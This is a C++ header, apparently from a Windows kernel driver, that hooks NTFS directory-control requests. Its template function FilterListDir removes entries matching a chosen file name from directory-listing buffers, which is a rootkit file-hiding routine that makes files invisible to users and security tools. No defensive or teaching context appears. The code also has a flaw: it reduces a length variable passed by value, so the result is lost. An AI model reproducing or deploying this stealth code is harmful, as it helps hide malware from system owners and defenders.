#pragma once
#include "../../stdafx.h"
#include "../../Structs/Structs.h"
#include "../../NtfsIRPManager/NtfsIRPManager.h"

NTSTATUS HookDirectoryControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

template <typename EntryType>
void FilterListDir(PVOID listDirBuffer, ULONG_PTR listDirSize, PWCHAR fileName, ULONG newListDirLength)
{    
    EntryType* currentEntry = (EntryType*)listDirBuffer; 
    EntryType* lastEntry = NULL; 
    PBYTE copyPosition = (PBYTE)listDirBuffer; 
    ULONG fileNameLength = wcslen(fileName); 
    while (TRUE) 
    {
            
        ULONG offset = currentEntry->NextEntryOffset; 
        ULONG copySize; 
        if (offset == 0) 
        {
            copySize = listDirSize - ((PBYTE)currentEntry - listDirBuffer); 
        }
        else 
        {                    
            copySize = offset; 
        }                  
        

        if (currentEntry->FileNameLength / 2 == fileNameLength && !wcsncmp(currentEntry->FileName, fileName, fileNameLength)) 
        {                            
            /*DbgPrint ("Match %S %s\n", currentEntry->FileName, #EntryType);*/
            newListDirLength -= copySize; 
            if ((currentEntry->NextEntryOffset == 0) && (lastEntry != NULL)) 
            {                       
                lastEntry->NextEntryOffset = 0; 
            }
        }
        else 
        {                   
            //DbgPrintEx (DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "No match %S %d %d\n", currentEntry->FileName, currentEntry->FileNameLength, fileNameLength);
            if (copyPosition != (PBYTE)currentEntry) 
            {                                    
                RtlCopyMemory(copyPosition, currentEntry, copySize); 
            }
            lastEntry = currentEntry; 
            copyPosition += copySize; 
        }
                            
        if (offset == 0) 
        {        
            break; 
        }
                                            
         currentEntry = (EntryType*)((char*)currentEntry + offset);          
    }
}
